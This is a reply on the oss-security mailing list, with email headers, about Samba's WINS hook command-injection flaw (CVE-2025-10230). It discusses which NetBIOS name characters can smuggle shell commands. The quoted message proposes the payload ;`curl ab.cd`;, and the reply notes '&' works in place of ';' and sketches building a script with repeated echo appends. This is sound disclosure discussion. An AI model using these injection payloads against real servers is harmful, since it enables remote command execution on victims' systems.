Received: (qmail 28647 invoked by uid 550); 16 Oct 2025 00:45:31 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
x-ms-reactions: disallow
Received: (qmail 24020 invoked from network); 16 Oct 2025 00:40:08 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=simple/simple; d=catalyst.net.nz;
	s=default; t=1760575198;
	bh=jD5kqokEkL1SmZoIExcdnIQTGcFNwGMQegL856GgONg=;
	h=Date:Subject:To:References:From:In-Reply-To:From;
	b=ynsdcENDIwDSEVLVtkx1P+iFaIyejRuKVBYmpkDeijrNHob5DYKrQ/cL66oPUTZp8
	 r7lTkgP4IeYLlBkYVw6QdcLzWoquCNDkgbnJVYQAxNi3h/EqxfPqw2xcs+FGQWtLKd
	 vTQc+npNffppwThpc0tgVTCH1Vq5BtfujH1z5JoThUXiKBlrs5LgPR8wdUJtAUWO5K
	 GBuL2O8ebrxPsAF++4r4JYSi/IXTsAPQeTVLmhhbCt+e3PTGhr97stPewcVY5wvP7x
	 E+7e/PoxG7yw88G7w2qf7db1md7Mh5ADJvPth4XvkmG+xby63+L/04+SpJJujUb1rT
	 WnSoJvBWv6RTg==
Message-ID: <5b273beb-4110-4710-97ea-befaf5d4d6b1@catalyst.net.nz>
Date: Thu, 16 Oct 2025 13:39:57 +1300
MIME-Version: 1.0
User-Agent: Mozilla Thunderbird
To: oss-security@lists.openwall.com,
 "Caveney, Seamus G" <sgcaveney@seattleschools.org>
References: <20f5f042-d3de-411b-aa09-b2c46ee19cc8@samba.org>
 <da7aa05f-01c0-4798-8496-33f1c0010e4e@catalyst.net.nz>
 <2338e6b3-44d5-4d9e-bd94-e3b96534359d@catalyst.net.nz>
 <DS1PR04MB965568BE9229892AA593E6E8C0E8A@DS1PR04MB9655.namprd04.prod.outlook.com>
Content-Language: en-NZ
From: Douglas Bagnall <douglas.bagnall@catalyst.net.nz>
Autocrypt: addr=douglas.bagnall@catalyst.net.nz; keydata=
 xsBNBFTZNuABCACnBtS+eLzGts68jAJrZstbH5vM0d/4+OsGcvFkrXGPE9D6PsRdVM+jPT1Z
 fASzsarvWkx0b7p6/XTwTo2Al3KRRVLq3FQFPOLyKzSXK8u+vUi/py7Cv133t4Uea7+Pp+YM
 tWjXGwB/y3s5TBwJkYShSTBpAhDnkKjxRSQXIr7gIE0fIPIS1uy19g1q/BuXuj1sfcISRMpp
 z8qs9cAsk45tG1JItaLjO7+K47Q3LEfskChGPbhwh7tWCquDzreQC7q+h3dK6A1AOrorskON
 +Wy3aucRoOw6scNfV2H1y6lDza2lwZxCDRs6zkn7SQVjX62j9kVczShyi5udgqfWsW2jABEB
 AAHNMURvdWdsYXMgQmFnbmFsbCA8ZG91Z2xhcy5iYWduYWxsQGNhdGFseXN0Lm5ldC5uej7C
 wHgEEwECACIFAlTZNuACGwMGCwkIBwMCBhUIAgkKCwQWAgMBAh4BAheAAAoJEHcqM0mxsX5t
 XIoH/jiHvUuw4xrBKuk9KzAE5JNd5rcTQdaRgiIvM/6C6X/uobzO2CDKFEUOmTpYSSXkq0/3
 YmwCRqWMja/5N1886qFrkcrIkTMRb0imxkNVwd7JIPdryK6dFCzCRUC1hByqeI8EwO41ROX+
 qw6DT+H/o6QkPWAB1P8ODVtq0F3TUZ0/Xpe3xYK1QF6Ud0BKWVcKBMAdS7CWTsVRD6m9it80
 Mp4N3y6Ka0vrgZ6IEskBHGVJ/Mm6ONrHIjl4OAbAKK4PuFha5PjPx1YYYOnsp4JvhrSJQDag
 A9vDdm7mbJpxxVY0Rx4t7xRvh+jsZ1f6yVGx5UTpdtvSbriZ2SZ3F29hBGfOwE0EVNk24AEI
 ANSG9xaPHGxr7l1Wcz8J51IDT0EE7ozS3TSYRE80OSH8oB26w5StLbQkC+iWj0GsTveJL9x6
 Vp/dfsPGfG9CP9J0C4ZOwY7+V9ex1d10xzr32zetKiUt7ZEimzIiCnmnR9K54jVbGDvVfJie
 uTOGruqRLIUAO69ZyhplRywyee6MRtgmfLpJlnOySgvihR4kHmq03zHe6whhJ0RmbKSIwb/F
 Ri/ZmpujNZ7PTYcmw7sp/5HpE4taYA0f3QvK9/DTjuoITdugrxhOwBdv6jLAAzI8d0quOFf+
 5IeGizYTa6HPmBtIUyyzVajjiUpXiB8WuhgTL5pP0BT5j6BtW8Li/YEAEQEAAcLAXwQYAQIA
 CQUCVNk24AIbDAAKCRB3KjNJsbF+bYRnB/94DaFuxGVA65kkr5iubWbwKnaiTWlZLIFQp0RH
 QRk/jgdpuQj3E4D660QdfoMqhTeozOPTBH3cJOCjgN/klI7xrkvdq8sLTMWyM5Bbu+XhDaSr
 8hnjvdhZM7bHQdaH3FI5zdm2rMbP8nB6IH8wYSxHzywjR9vks6PTsqxqeCoupqdVO/kZ3jsU
 F0LOxxnMTlT8YZIn8lFVptsz5HMOKFnUdR3fYpcO+CTc9vXqcLWqnMwchdSQPp1cjZ5eUl+G
 jmq9xwOWLG/0u5b9stC3cEiCNSZn8Nyy7KaY8fQeKn//sBeyu3htjZ2wZ+oRVuc/XR/+/hl6
 QCGP/4UC6mJGdmU0
In-Reply-To: <DS1PR04MB965568BE9229892AA593E6E8C0E8A@DS1PR04MB9655.namprd04.prod.outlook.com>
Content-Type: text/plain; charset=UTF-8; format=flowed
Content-Transfer-Encoding: 7bit
Subject: Re: [oss-security] Samba security releases for CVE-2025-10230 and
 CVE-2025-9640

On 16/10/25 12:30, Caveney, Seamus G wrote:

> Illegal characters in a NetBIOS hostname are:
> 
> \ / : * ? " < > | ,
> 
> notably excluding backticks and semicolons. I'm not deeply familiar
> with the Samba code base but a glance at nbtname.c and winsserver.c
> seems to suggest that those character limitations aren't enforced at
> the protocol level, so it might be possible to use pipes, redirects
> or exec a local binary with a short path. Otherwise, the easiest
> exploitable payload I can think of would be:
> 
> ;`curl ab.cd`;

The characters '<', ';', and '>' are blocked by the needs of the ldb
database that this server uses (I am not sure I checked '`', but it is
probably allowed). But of course '&' works just as well as ';'.

If '>' worked, I think you could build up a script with a lot of
"&echo foo>>x&" followed by a `tr`.

> I'd be interested to see if anybody has a living Samba install
> configured as a DC with WINS still running in 2025.

Me too!

The last indication of a 'wins hook' line I have seen was in 2016, and 
that was commented out.

An example of a place that may use it is a factory where some machinery 
is a few decades old and only knows WINS but otherwise still works well.

cheers,
Douglas
